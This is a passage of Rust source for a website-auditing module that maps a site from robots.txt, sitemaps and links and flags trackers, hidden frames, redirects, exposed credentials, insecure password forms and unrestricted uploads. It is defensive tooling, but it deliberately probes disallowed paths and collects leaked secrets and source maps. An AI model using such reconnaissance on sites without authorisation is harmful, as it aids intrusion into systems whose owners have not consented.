//! A website on an HTTP service: its paths, mapped from `robots.txt`, its
//! sitemaps and its own links, and what its code does and gives away, read
//! from each page, every script it loads and whatever else it serves.
//!
//! Nothing is run. Pages and scripts are fetched with plain `GET`s inside the
//! scanner and their source is read for code that reaches into a visitor's
//! browser (location, the visitor's IP address, device fingerprinting,
//! camera and sensors, keystrokes, crypto mining, hidden frames, redirects,
//! trackers and session recorders) and for what the site itself exposes: its
//! forms (where each submits, file uploads, credentials in the markup,
//! passwords sent in the address or in the clear, posts with no anti-forgery
//! token), credentials left in its own code, the requests that code makes,
//! PHP source and source maps it serves, what its `robots.txt` points to, and
//! on WordPress, what that gives away. Code that only builds these calls as
//! it runs can slip past a reading.
//!
//! Every concern names the file it's in, and the report re-prints the part
//! of that file it's in (see [`source`]).

use std::collections::{HashSet, VecDeque};

use futures::future::join_all;
use reqwest::{Client, Url};
use serde::Serialize;

use crate::source::{self, Mark, SourceFile};
use crate::{code, wordpress, Baseline};

/// Pages fetched per site, at most.
const MOST_PAGES: usize = 100;
/// How many links deep from the start the crawl follows.
const DEEPEST: usize = 3;
/// Scripts read per site, at most.
const MOST_SCRIPTS: usize = 60;
/// Sitemap documents read per site, at most.
const MOST_SITEMAPS: usize = 5;
/// The most of any one body read.
const BIGGEST: usize = 3 * 1024 * 1024;
/// Requests in flight at once.
const AT_ONCE: usize = 8;
/// Files kept to show in the report, at most.
const MOST_FILES: usize = 80;

/// Paths not worth fetching as pages: images, styles, fonts, media, archives.
const ASSETS: &[&str] = &[
    ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico", ".webp", ".avif", ".css", ".js", ".mjs",
    ".map", ".woff", ".woff2", ".ttf", ".otf", ".eot", ".pdf", ".zip", ".gz", ".tar", ".mp4",
    ".webm", ".mp3", ".wav", ".avi", ".mov", ".dmg", ".exe", ".iso",
];

/// One path on the site.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Page {
    pub path: String,
    pub status: u16,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub title: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub content_type: Option<String>,
    /// How it was found: `start`, `url`, `link`, `sitemap` or `robots`.
    pub found: &'static str,
}

/// A script a page loads from a URL.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Script {
    pub url: String,
    /// Served from another site than the one scanned.
    pub third_party: bool,
    /// Bytes read; 0 when it couldn't be fetched.
    pub bytes: usize,
}

/// What a concern means, and what could happen because of it.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct Says {
    pub why: &'static str,
    pub impact: &'static str,
}

/// Something the site's code does or gives away.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize)]
pub struct Signal {
    /// Forms, Secrets, Location, Fingerprinting, ...
    pub category: &'static str,
    pub label: String,
    /// `high`, `medium`, `low`, or `info` for a form with nothing wrong.
    pub severity: &'static str,
    /// What it is.
    pub why: &'static str,
    /// What could happen because of it.
    pub impact: &'static str,
    /// The code or markup that showed it.
    pub evidence: String,
    /// The page it was on.
    pub page: String,
    /// The script it was in; `None` for the page's own markup or inline code.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub script: Option<String>,
    /// The file it's in: the `url` of one of the site's `files`.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub file: Option<String>,
    /// Where in that file's shown text.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub mark: Option<Mark>,
    /// For one thing with several problems, such as a form, each of them.
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub issues: Vec<Issue>,
    /// Its byte range in the file's text, until the file is shown.
    #[serde(skip)]
    pub span: Option<(usize, usize)>,
}

/// One problem with something that has several.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize)]
pub struct Issue {
    pub label: String,
    pub severity: &'static str,
    pub why: &'static str,
    pub impact: &'static str,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub mark: Option<Mark>,
    #[serde(skip)]
    pub span: Option<(usize, usize)>,
}

/// A request the site makes: from a form, its own code, or the parameters
/// PHP source it serves reads.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Request {
    /// `GET`, `POST`, ..., `WS` for a WebSocket, or for PHP's parameters
    /// `ANY`, `COOKIE` or `FILE`.
    pub method: String,
    /// Where it goes: a path on this site, or a full address elsewhere.
    pub url: String,
    /// The parameters it sends, where they are known.
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub params: Vec<String>,
    /// The page it was on.
    pub page: String,
    /// The script it was in; `None` for the page's own markup or inline code.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub script: Option<String>,
}

/// A site, mapped and read.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize)]
pub struct Site {
    /// `scheme://host:port`.
    pub base: String,
    pub pages: Vec<Page>,
    pub scripts: Vec<Script>,
    pub signals: Vec<Signal>,
    /// Pages on other hosts the site links to, in its markup or its scripts:
    /// often its own subdomains.
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub links: Vec<String>,
    /// The requests its forms and its own code make.
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub requests: Vec<Request>,
    /// The files its signals are in, as the report shows them.
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub files: Vec<SourceFile>,
    /// Whether it runs WordPress.
    #[serde(skip)]
    pub wordpress: bool,
    /// The text of each file a signal was found in, until it's shown.
    #[serde(skip)]
    texts: Vec<Text>,
}

/// A file's whole text, kept until the report shows the part it needs.
#[derive(Debug, Clone, PartialEq, Eq)]
struct Text {
    url: String,
    name: String,
    kind: &'static str,
    text: String,
}

/// Links kept per site, at most.
const MOST_LINKS: usize = 300;
/// Requests kept per site, at most.
const MOST_REQUESTS: usize = 300;
/// Source maps read per site, at most.
const MOST_MAPS: usize = 10;

/// Where code being read sits: the page it's on, the script it's in, the
/// file it's shown as, and where in that file it starts.
#[derive(Debug, Clone, Copy)]
struct Loc<'a> {
    page: &'a str,
    script: Option<&'a str>,
    file: &'a str,
    base: usize,
}

impl<'a> Loc<'a> {
    fn new(page: &'a str, script: Option<&'a str>, file: &'a str) -> Self {
        Loc {
            page,
            script,
            file,
            base: 0,
        }
    }

    /// The same place, for code starting `by` bytes further into the file.
    fn shift(self, by: usize) -> Self {
        Loc {
            base: self.base + by,
            ..self
        }
    }

    /// A signal at byte range `span` of the code being read.
    fn signal(
        &self,
        category: &'static str,
        label: impl Into<String>,
        severity: &'static str,
        says: Says,
        evidence: String,
        span: (usize, usize),
    ) -> Signal {
        Signal {
            category,
            label: label.into(),
            severity,
            why: says.why,
            impact: says.impact,
            evidence,
            page: self.page.to_string(),
            script: self.script.map(str::to_string),
            file: Some(self.file.to_string()),
            span: Some((self.base + span.0, self.base + span.1)),
            ..Signal::default()
        }
    }
}

/// Where `part`, a slice of `whole`, starts in it.
fn offset(whole: &str, part: &str) -> usize {
    part.as_ptr() as usize - whole.as_ptr() as usize
}

/// A file's path as the explorer shows it: on this site its path, with
/// `index.html` for a directory, and elsewhere with the host first.
fn file_name(root: &Url, url: &Url) -> String {
    let path = url.path();
    let path = if path.ends_with('/') {
        format!("{path}index.html")
    } else {
        path.to_string()
    };
    if same_origin(root, url) {
        path
    } else {
        format!("{}{path}", url.host_str().unwrap_or(""))
    }
}

/// The language of a file by its name, else `default`.
fn kind_of(name: &str, default: &'static str) -> &'static str {
    let lower = name.to_ascii_lowercase();
    let ext = lower.rsplit_once('.').map_or("", |(_, e)| e);
    match ext {
        "js" | "mjs" | "cjs" | "jsx" | "ts" | "tsx" | "vue" | "svelte" => "js",
        "php" | "phtml" => "php",
        "css" | "scss" | "less" => "css",
        "json" | "map" => "json",
        "html" | "htm" => "html",
        "xml" => "xml",
        "txt" | "log" => "text",
        _ => default,
    }
}

/// Adds signals found in a file, keeping the file's text to show when
/// there are any.
fn add(
    site: &mut Site,
    signals: Vec<Signal>,
    url: &str,
    name: String,
    kind: &'static str,
    text: &str,
) {
    if signals.is_empty() {
        return;
    }
    keep(site, url, name, kind, text);
    site.signals.extend(signals);
}

fn keep(site: &mut Site, url: &str, name: String, kind: &'static str, text: &str) {
    if site.texts.len() < MOST_FILES && !site.texts.iter().any(|t| t.url == url) {
        site.texts.push(Text {
            url: url.to_string(),
            name,
            kind,
            text: text.to_string(),
        });
    }
}

/// Keeps `url` among the site's links when it's on another host.
fn link_out(site: &mut Site, root: &Url, url: Url) {
    let web = matches!(url.scheme(), "http" | "https");
    if web && url.host_str() != root.host_str() && site.links.len() < MOST_LINKS {
        let mut url = url;
        url.set_fragment(None);
        let url = url.to_string();
        if !site.links.contains(&url) {
            site.links.push(url);
        }
    }
}

/// Absolute web addresses a script names as string literals.
fn addresses(code: &str) -> Vec<&str> {
    let mut out = Vec::new();
    for scheme in [
        "\"https://",
        "'https://",
        "`https://",
        "\"http://",
        "'http://",
        "`http://",
    ] {
        let quote = &scheme[..1];
        let mut from = 0;
        while let Some(i) = code[from..].find(scheme).map(|i| i + from + 1) {
            let Some(end) = code[i..].find(quote).map(|e| e + i) else {
                break;
            };
            if end - i < 300 {
                out.push(&code[i..end]);
            }
            from = end + 1;
        }
    }
    out
}

/// A source map a script named, to read after the scripts.
struct MapRef {
    map: Url,
    script: String,
    page: String,
    /// Where the script names it.
    span: (usize, usize),
}

/// Maps and reads the site at `base`, starting from `/` and `start` (such
/// as a URL's own path). `soft404` is how the service answers a path that
/// can't exist, when it answers every path.
pub async fn explore(
    client: &Client,
    base: &str,
    start: &[String],
    soft404: Option<&Baseline>,
) -> Site {
    let Ok(root) = Url::parse(base) else {
        return Site::default();
    };
    let mut site = Site {
        base: base.trim_end_matches('/').to_string(),
        ..Site::default()
    };
    let mut seen = HashSet::new();
    let mut queue = VecDeque::new();
    enqueue(&mut seen, &mut queue, "/".to_string(), 0, "start");
    for path in start {
        enqueue(&mut seen, &mut queue, path.clone(), 0, "url");
    }
    let robots = from_robots_and_sitemaps(client, &root, &mut seen, &mut queue).await;
    site.wordpress = robots
        .named
        .iter()
        .any(|(path, _)| path.starts_with("/wp-admin"));

    let mut scripts: Vec<String> = Vec::new();
    crawl(
        client,
        &root,
        &mut site,
        &mut seen,
        &mut queue,
        &mut scripts,
        true,
    )
    .await;

    // Every script the pages load, from this site or any other. The site's
    // own scripts also name its routes, which a single-page app never links
    // in its markup.
    scripts.truncate(MOST_SCRIPTS);
    let mut maps: Vec<MapRef> = Vec::new();
    for chunk in scripts.chunks(AT_ONCE) {
        let bodies = join_all(chunk.iter().map(|u| body(client, u))).await;
        for (url, code) in chunk.iter().zip(bodies) {
            let parsed = Url::parse(url).ok();
            let third_party = parsed.as_ref().map_or(true, |u| !same_origin(&root, u));
            site.scripts.push(Script {
                url: url.clone(),
                third_party,
                bytes: code.as_ref().map_or(0, String::len),
            });
            let Some(code) = code else { continue };
            let page = first_page_with(&site, url);
            let at = Loc::new(&page, Some(url), url);
            let mut found = read_code(&code, at);
            let mut named_map = false;
            if !third_party {
                for route in routes(&code) {
                    enqueue(&mut seen, &mut queue, route, DEEPEST, "script");
                }
                for address in addresses(&code) {
                    if let Ok(u) = Url::parse(address) {
                        link_out(&mut site, &root, u);
                    }
                }
                found.extend(own_code(&mut site.requests, &root, &code, at));
                if let Some((span, name)) = source_map(&code) {
                    if name.starts_with("data:") {
                        found.push(at.signal(
                            "Source",
                            "Ships its source code",
                            "medium",
                            SOURCE,
                            format!(
                                "sourceMappingURL={}...",
                                name.chars().take(40).collect::<String>()
                            ),
                            span,
                        ));
                    } else if let Some(map) = Url::parse(url)
                        .ok()
                        .and_then(|u| u.join(name).ok())
                        .filter(|m| same_origin(&root, m))
                    {
                        if maps.len() < MOST_MAPS && !maps.iter().any(|m| m.map == map) {
                            named_map = true;
                            maps.push(MapRef {
                                map,
                                script: url.clone(),
                                page: page.clone(),
                                span,
                            });
                        }
                    }
                }
            }
            let name = parsed
                .as_ref()
                .map_or_else(|| url.clone(), |u| file_name(&root, u));
            let kind = kind_of(&name, "js");
            if named_map {
                keep(&mut site, url, name.clone(), kind, &code);
            }
            add(&mut site, found, url, name, kind, &code);
        }
    }
    read_maps(client, &root, &mut site, &maps).await;
    crawl(
        client,
        &root,
        &mut site,
        &mut seen,
        &mut queue,
        &mut scripts,
        false,
    )
    .await;
    robots_signals(client, &root, &mut site, &robots, soft404).await;
    php_source(client, &root, &mut site).await;
    if site.wordpress {
        for (signal, path, text, kind) in wordpress::check(client, &root).await {
            let Ok(u) = root.join(&path) else { continue };
            let url = u.to_string();
            let signal = Signal {
                file: Some(url.clone()),
                ..signal
            };
            add(&mut site, vec![signal], &url, path, kind, &text);
        }
    }
    dedupe(&mut site.signals);
    place(&mut site);
    site
}

/// Fetches what's queued, recording each path. When `read`, each page's
/// markup is read too and its links followed, up to [`MOST_PAGES`];
/// otherwise the paths are only recorded, up to as many again.
async fn crawl(
    client: &Client,
    root: &Url,
    site: &mut Site,
    seen: &mut HashSet<String>,
    queue: &mut VecDeque<(String, usize, &'static str)>,
    scripts: &mut Vec<String>,
    read: bool,
) {
    let most = if read { MOST_PAGES } else { MOST_PAGES * 2 };
    while !queue.is_empty() && site.pages.len() < most {
        let n = queue.len().min(AT_ONCE).min(most - site.pages.len());
        let batch: Vec<(String, usize, &'static str)> = queue.drain(..n).collect();
        let fetched = join_all(batch.iter().map(|(path, _, _)| get(client, root, path))).await;
        for ((path, depth, found), got) in batch.into_iter().zip(fetched) {
            let Some(got) = got else { continue };
            site.pages.push(Page {
                path: path.clone(),
                status: got.status,
                title: got.html.as_deref().and_then(title),
                content_type: got.content_type.clone(),
                found,
            });
            if let Some(location) = got.location.as_deref() {
                redirect(site, root, &got, &path, location);
            }
            let Some(html) = got.html.as_deref().filter(|_| read) else {
                continue;
            };
            read_page(site, root, &got.url, &path, html, scripts);
            for link in values(html, "a", "href") {
                match local_path(root, &got.url, link) {
                    Some(next) if depth < DEEPEST => enqueue(seen, queue, next, depth + 1, "link"),
                    Some(_) => {}
                    None => {
                        if let Ok(u) = got.url.join(link.trim()) {
                            link_out(site, root, u);
                        }
                    }
                }
            }
        }
    }
}

const LEAVES: Says = Says {
    why: "Opening this path sends you on to a different site.",
    impact: "Visitors land on a site this one doesn't control. If that site is compromised, or the redirect was planted, it's a ready-made route to phishing or malware.",
};

/// A path that redirects to another site, shown as the answer it gave.
fn redirect(site: &mut Site, root: &Url, got: &Got, path: &str, location: &str) {
    let Some(to) = got.url.join(location).ok() else {
        return;
    };
    if same_site(root, &to) || !(300..400).contains(&got.status) {
        return;
    }
    let head = format!("HTTP {}\nLocation: ", got.status);
    let text = format!("{head}{location}\n");
    let url = got.url.to_string();
    let signal = Loc::new(path, None, &url).signal(
        "Redirects and frames",
        format!("Redirects to {}", to.host_str().unwrap_or("another site")),
        "medium",
        LEAVES,
        format!("{} to {to}", got.status),
        (head.len(), head.len() + location.len()),
    );
    add(
        site,
        vec![signal],
        &url,
        file_name(root, &got.url),
        "http",
        &text,
    );
}

/// Paths a script names as string literals, `"/docs/install"`: the routes a
/// single-page app knows but never links in its markup.
fn routes(code: &str) -> Vec<String> {
    const MOST: usize = 200;
    let bytes = code.as_bytes();
    let mut out: Vec<String> = Vec::new();
    let mut i = 0;
    while i + 2 < bytes.len() && out.len() < MOST {
        let quote = bytes[i];
        if matches!(quote, b'"' | b'\'' | b'`') && bytes[i + 1] == b'/' {
            let start = i + 1;
            let mut j = start + 1;
            while j < bytes.len()
                && j - start < 100
                && (bytes[j].is_ascii_alphanumeric() || b"/-_.".contains(&bytes[j]))
            {
                j += 1;
            }
            if j < bytes.len() && bytes[j] == quote {
                let path = &code[start..j];
                if route_like(path) && !out.iter().any(|p| p == path) {
                    out.push(path.to_string());
                }
                i = j + 1;
                continue;
            }
        }
        i += 1;
    }
    out
}

/// Whether a string reads as a site's route: a letter after the slash, no
/// `//` or `..`, and not a file such as a script or image.
fn route_like(path: &str) -> bool {
    let lower = path.to_ascii_lowercase();
    path.len() > 1
        && path.as_bytes()[1].is_ascii_alphabetic()
        && !path.contains("//")
        && !path.contains("..")
        && !ASSETS.iter().any(|ext| lower.ends_with(ext))
}

fn enqueue(
    seen: &mut HashSet<String>,
    queue: &mut VecDeque<(String, usize, &'static str)>,
    path: String,
    depth: usize,
    found: &'static str,
) {
    let lower = path.to_ascii_lowercase();
    if ASSETS.iter().any(|ext| lower.ends_with(ext)) {
        return;
    }
    if seen.insert(path.clone()) {
        queue.push_back((path, depth, found));
    }
}

/// What `robots.txt` said: its text, and each path it names with its line.
#[derive(Default)]
struct Robots {
    text: String,
    named: Vec<(String, String)>,
}

/// Paths `robots.txt` names (disallowed ones too: they are often what a site
/// would rather not list) and the pages in the site's sitemaps.
async fn from_robots_and_sitemaps(
    client: &Client,
    root: &Url,
    seen: &mut HashSet<String>,
    queue: &mut VecDeque<(String, usize, &'static str)>,
) -> Robots {
    let mut robots = Robots::default();
    let mut sitemaps: Vec<Url> = root.join("/sitemap.xml").into_iter().collect();
    if let Some(url) = root.join("/robots.txt").ok().map(|u| u.to_string()) {
        if let Some(text) = body(client, &url).await {
            for line in text.lines() {
                let Some((key, value)) = line.split_once(':') else {
                    continue;
                };
                let value = value.trim();
                match key.trim().to_ascii_lowercase().as_str() {
                    "disallow" | "allow" if value.starts_with('/') && !value.contains('*') => {
                        let path = value.trim_end_matches('$').to_string();
                        if robots.named.len() < 200 {
                            robots.named.push((path.clone(), line.trim().to_string()));
                        }
                        enqueue(seen, queue, path, DEEPEST, "robots");
                    }
                    "sitemap" => {
                        if let Ok(u) = Url::parse(value) {
                            if same_origin(root, &u) && !sitemaps.contains(&u) {
                                sitemaps.push(u);
                            }
                        }
                    }
                    _ => {}
                }
            }
            robots.text = text;
        }
    }
    let mut read = 0;
    while let Some(map) = sitemaps.pop() {
        if read == MOST_SITEMAPS {
            break;
        }
        read += 1;
        let Some(xml) = body(client, map.as_str()).await else {
            continue;
        };
        let index = xml.contains("<sitemapindex");
        for loc in between(&xml, "<loc>", "</loc>") {
            let Ok(u) = Url::parse(loc.trim()) else {
                continue;
            };
            if !same_origin(root, &u) {
                continue;
            }
            if index {
                sitemaps.push(u);
            } else {
                enqueue(seen, queue, u.path().to_string(), DEEPEST, "sitemap");
            }
        }
    }
    robots
}

/// A fetched path.
struct Got {
    url: Url,
    status: u16,
    content_type: Option<String>,
    location: Option<String>,
    /// The body, when it's a page.
    html: Option<String>,
}

async fn get(client: &Client, root: &Url, path: &str) -> Option<Got> {
    let url = root.join(path).ok()?;
    let resp = client.get(url.clone()).send().await.ok()?;
    let header = |name: &str| {
        resp.headers()
            .get(name)
            .and_then(|v| v.to_str().ok())
            .map(str::to_string)
    };
    let content_type = header("content-type");
    let location = header("location");
    let status = resp.status().as_u16();
    let page =
        resp.status().is_success() && content_type.as_deref().is_some_and(|t| t.contains("html"));
    let html = if page { read(resp).await } else { None };
    Some(Got {
        url,
        status,
        content_type,
        location,
        html,
    })
}

/// The body at `url`, when it answers with success.
async fn body(client: &Client, url: &str) -> Option<String> {
    let resp = client.get(url).send().await.ok()?;
    if !resp.status().is_success() {
        return None;
    }
    read(resp).await
}

async fn read(resp: reqwest::Response) -> Option<String> {
    let bytes = crate::capped(resp, BIGGEST).await?;
    Some(String::from_utf8_lossy(&bytes).into_owned())
}

fn same_origin(a: &Url, b: &Url) -> bool {
    a.scheme() == b.scheme()
        && a.host_str() == b.host_str()
        && a.port_or_known_default() == b.port_or_known_default()
}

/// Whether two URLs are on the same site by name, whatever their scheme or
/// port, `www.` aside: moving from HTTP to HTTPS, or to `www.`, isn't
/// leaving the site.
fn same_site(a: &Url, b: &Url) -> bool {
    let name = |u: &Url| {
        u.host_str()
            .map(|h| h.trim_start_matches("www.").to_ascii_lowercase())
    };
    name(a) == name(b)
}

/// A link's path on this site, or `None` for one elsewhere or not a page.
fn local_path(root: &Url, page: &Url, link: &str) -> Option<String> {
    let link = link.trim();
    let lower = link.to_ascii_lowercase();
    if link.is_empty()
        || link.starts_with('#')
        || ["mailto:", "tel:", "javascript:", "data:"]
            .iter()
            .any(|s| lower.starts_with(*s))
    {
        return None;
    }
    let u = page.join(link).ok()?;
    same_origin(root, &u).then(|| u.path().to_string())
}

/// The page that first loaded the script at `url`, by its signals' record
/// of where scripts came from, else the site's root.
fn first_page_with(site: &Site, url: &str) -> String {
    site.signals
        .iter()
        .find(|s| s.category == "Scripts" && s.evidence == url)
        .map_or_else(|| "/".to_string(), |s| s.page.clone())
}

const HIDDEN_FRAME: Says = Says {
    why: "An invisible frame loads another page in the background, a common way to run code or track you out of sight.",
    impact: "The frame's page runs with nothing on screen to show it: trackers, ad fraud, or on a compromised site, a drive-by download.",
};
const CLEAR_PASSWORD: Says = Says {
    why: "Anything typed into this page travels unencrypted and can be read on the way.",
    impact: "Anyone on the same Wi-Fi or anywhere on the network path can read the password as it's sent, and sign in with it.",
};
const META_REDIRECT: Says = Says {
    why: "The page sends you on to a different site as soon as it loads.",
    impact: LEAVES.impact,
};

/// Reads one page's markup: the scripts it loads, its inline code, its
/// forms, credentials in it, hidden frames and redirects.
fn read_page(
    site: &mut Site,
    root: &Url,
    url: &Url,
    path: &str,
    html: &str,
    scripts: &mut Vec<String>,
) {
    let lower = html.to_ascii_lowercase();
    let file = url.to_string();
    let at = Loc::new(path, None, &file);
    let mut found = Vec::new();
    for (tag, inner) in elements(html, &lower, "script") {
        match value(tag, "src") {
            Some(src) => {
                found.extend(trackers(src, at.shift(offset(html, src))));
                if let Ok(u) = url.join(src.trim()) {
                    let u = u.to_string();
                    if !scripts.contains(&u) {
                        // Remembered so the script's findings name this page.
                        site.signals.push(Signal {
                            category: "Scripts",
                            evidence: u.clone(),
                            page: path.to_string(),
                            ..Signal::default()
                        });
                        scripts.push(u);
                    }
                }
            }
            None => {
                let inline = at.shift(offset(html, inner));
                found.extend(trackers(inner, inline));
                found.extend(read_code(inner, inline));
                found.extend(own_code(&mut site.requests, root, inner, inline));
            }
        }
    }
    // Credentials left in the markup: comments, inline data, attributes.
    found.extend(secret_signals(html, at));
    if ["/wp-content/", "/wp-includes/", "content=\"wordpress"]
        .iter()
        .any(|w| lower.contains(*w))
    {
        site.wordpress = true;
    }
    found.extend(forms(&mut site.requests, root, url, html, &lower, at));
    for (tag, _) in elements(html, &lower, "iframe") {
        let t = tag.to_ascii_lowercase().replace(' ', "");
        let hidden = [
            "display:none",
            "visibility:hidden",
            "width=\"0\"",
            "height=\"0\"",
            "width=0",
            "height=0",
            "width=\"1\"",
            "height=\"1\"",
        ]
        .iter()
        .any(|h| t.contains(*h));
        if hidden {
            let start = offset(html, tag);
            found.push(at.signal(
                "Redirects and frames",
                "Loads a hidden frame",
                "medium",
                HIDDEN_FRAME,
                snippet(tag),
                (start, start + tag.len()),
            ));
        }
    }
    // A password field outside any form still sends what's typed into it.
    let password = ["type=\"password\"", "type='password'", "type=password"]
        .iter()
        .find_map(|p| lower.find(*p).map(|i| (i, p.len())));
    let in_form = found
        .iter()
        .any(|s| s.category == "Forms" && s.issues.iter().any(|i| i.label.contains("password")));
    if let Some((i, len)) = password.filter(|_| root.scheme() == "http" && !in_form) {
        found.push(at.signal(
            "Forms",
            "Asks for a password over plain HTTP",
            "medium",
            CLEAR_PASSWORD,
            "<input type=\"password\">".to_string(),
            (i, i + len),
        ));
    }
    for (tag, _) in elements(html, &lower, "meta") {
        let refresh = value(tag, "http-equiv").is_some_and(|v| v.eq_ignore_ascii_case("refresh"));
        let Some(content) = value(tag, "content").filter(|_| refresh) else {
            continue;
        };
        let target = content
            .to_ascii_lowercase()
            .find("url=")
            .map(|i| content[i + 4..].trim_matches(['\'', '"', ' ']));
        let Some(to) = target.and_then(|t| url.join(t).ok()) else {
            continue;
        };
        if !same_site(root, &to) {
            let start = offset(html, tag);
            found.push(at.signal(
                "Redirects and frames",
                format!("Redirects to {}", to.host_str().unwrap_or("another site")),
                "medium",
                META_REDIRECT,
                snippet(tag),
                (start, start + tag.len()),
            ));
        }
    }
    add(site, found, &file, file_name(root, url), "html", html);
}

const FORM: Says = Says {
    why: "Where this form sends what's typed into it, and how.",
    impact: "",
};
const FORM_ISSUES: Says = Says {
    why: "Where this form sends what's typed into it, and what's wrong with how it does.",
    impact: "",
};
const ANY_UPLOAD: Says = Says {
    why: "Nothing in the form limits what can be sent. Make sure the server caps each upload's size and checks its type.",
    impact: "One script can send a huge file, or thousands of them, until the server's disk or memory runs out and it goes down. If uploads land where the web server serves them, an uploaded .php or .html file runs as code on your site.",
};
const UPLOAD: Says = Says {
    why: "Limits set in the page bind only browsers that respect them. The server has to cap each upload's size and check its type itself.",
    impact: "Anyone posting to it directly skips the page's limits: a file of any size or type, as often as they like, can fill the disk or memory, or put a script on the server.",
};
const PASSWORD_ELSEWHERE: Says = Says {
    why: "The page asks for a password and sends it to a different site than the one you'd be on, the shape of a phishing page.",
    impact: "Every password typed here goes to another host. If that isn't intended, someone is collecting your users' passwords.",
};
const PASSWORD_CLEAR: Says = Says {
    why: "The page is encrypted but its form posts to a plain HTTP address, so the password travels unencrypted.",
    impact: CLEAR_PASSWORD.impact,
};
const PASSWORD_GET: Says = Says {
    why: "The form submits with GET, so the password ends up in the address.",
    impact: "The password is kept in browser history and in server, proxy and analytics logs, and can leak to other sites in the Referer header.",
};
const PASSWORD_FILLED: Says = Says {
    why: "The page carries a password in its own markup.",
    impact: "Anyone who views the page's source can read the password and sign in with it.",
};
const HIDDEN_CREDENTIAL: Says = Says {
    why: "A hidden field carries what looks like a password or key. Hidden only means not drawn: it's in the page's source.",
    impact: "Anyone who views the page's source has the key or password, and can use it directly against whatever it unlocks.",
};
const NO_TOKEN: Says = Says {
    why: "Nothing in the form proves a submission came from this site, unless the server checks some other way, such as SameSite cookies.",
    impact: "Another site can make a signed-in visitor's browser submit this form without them knowing, changing their details or acting as them.",
};

/// Names of hidden fields that carry an anti-forgery token.
const FORGERY: &[&str] = &[
    "csrf",
    "xsrf",
    "token",
    "nonce",
    "authenticity",
    "verification",
];

/// A request's address as the site's requests list it: a path on this
/// site, else in full.
fn address(root: &Url, to: &Url) -> String {
    if !same_origin(root, to) {
        return to.to_string();
    }
    match to.query() {
        Some(q) => format!("{}?{q}", to.path()),
        None => to.path().to_string(),
    }
}

fn add_request(requests: &mut Vec<Request>, r: Request) {
    let known = requests
        .iter()
        .any(|x| x.method == r.method && x.url == r.url);
    if !known && requests.len() < MOST_REQUESTS {
        requests.push(r);
    }
}

/// How bad a severity is, worst first.
fn rank(severity: &str) -> u8 {
    match severity {
        "high" => 0,
        "medium" => 1,
        "low" => 2,
        _ => 3,
    }
}

/// Reads a page's forms: one concern each, naming where it submits and
/// how, with every problem it has: what it does with passwords, the files
/// it takes, credentials it carries, and whether it can be forged. Each is
/// listed among the site's requests too.
fn forms(
    requests: &mut Vec<Request>,
    root: &Url,
    url: &Url,
    html: &str,
    lower: &str,
    at: Loc,
) -> Vec<Signal> {
    let mut out = Vec::new();
    for (tag, inner) in elements(html, lower, "form") {
        let action = value(tag, "action")
            .map(str::trim)
            .filter(|a| !a.is_empty());
        let to = action
            .and_then(|a| url.join(a).ok())
            .unwrap_or_else(|| url.clone());
        let stated = value(tag, "method").map(|m| m.trim().to_ascii_uppercase());
        let method = stated.clone().unwrap_or_else(|| "GET".to_string());
        let dest = address(root, &to);
        let inner_lower = inner.to_ascii_lowercase();
        let inputs: Vec<&str> = elements(inner, &inner_lower, "input")
            .into_iter()
            .map(|(t, _)| t)
            .collect();
        let kind =
            |t: &str| value(t, "type").map_or(String::new(), |v| v.trim().to_ascii_lowercase());
        let name = |t: &str| value(t, "name").unwrap_or("").trim().to_string();
        let params: Vec<String> = ["input", "select", "textarea"]
            .iter()
            .flat_map(|n| elements(inner, &inner_lower, n))
            .map(|(t, _)| name(t))
            .filter(|n| !n.is_empty())
            .collect();
        add_request(
            requests,
            Request {
                method: method.clone(),
                url: dest.clone(),
                params,
                page: at.page.to_string(),
                script: None,
            },
        );

        let span = |part: &str| {
            let s = at.base + offset(html, part);
            Some((s, s + part.len()))
        };
        let mut issues = Vec::new();
        let mut issue = |label: String, severity: &'static str, says: Says, part: &str| {
            issues.push(Issue {
                label,
                severity,
                why: says.why,
                impact: says.impact,
                mark: None,
                span: span(part),
            });
        };
        let password = inputs.iter().copied().find(|t| kind(t) == "password");
        if let Some(field) = password {
            if !same_site(root, &to) {
                issue(
                    format!(
                        "Sends a password to {}",
                        to.host_str().unwrap_or("another site")
                    ),
                    "high",
                    PASSWORD_ELSEWHERE,
                    tag,
                );
            }
            if root.scheme() == "http" {
                issue(
                    "Asks for a password over plain HTTP".to_string(),
                    "medium",
                    CLEAR_PASSWORD,
                    field,
                );
            } else if to.scheme() == "http" {
                issue(
                    "Sends a password over plain HTTP".to_string(),
                    "medium",
                    PASSWORD_CLEAR,
                    tag,
                );
            }
            if stated.as_deref() == Some("GET") || (stated.is_none() && action.is_some()) {
                issue(
                    "Sends a password in the address".to_string(),
                    "medium",
                    PASSWORD_GET,
                    tag,
                );
            }
        }
        for t in &inputs {
            let v = value(t, "value").unwrap_or("");
            match kind(t).as_str() {
                "password" if !v.trim().is_empty() => issue(
                    "Fills in a password in the page".to_string(),
                    "high",
                    PASSWORD_FILLED,
                    t,
                ),
                "hidden" if code::credential_name(&name(t)) && code::credential_value(v) => issue(
                    format!("Hides a credential in the field {}", name(t)),
                    "high",
                    HIDDEN_CREDENTIAL,
                    t,
                ),
                _ => {}
            }
        }
        for t in inputs.iter().copied().filter(|t| kind(t) == "file") {
            let limited = value(t, "accept").is_some_and(|a| !a.trim().is_empty());
            if limited {
                issue("Takes file uploads".to_string(), "low", UPLOAD, t);
            } else {
                issue(
                    "Takes uploads of any file type".to_string(),
                    "medium",
                    ANY_UPLOAD,
                    t,
                );
            }
        }
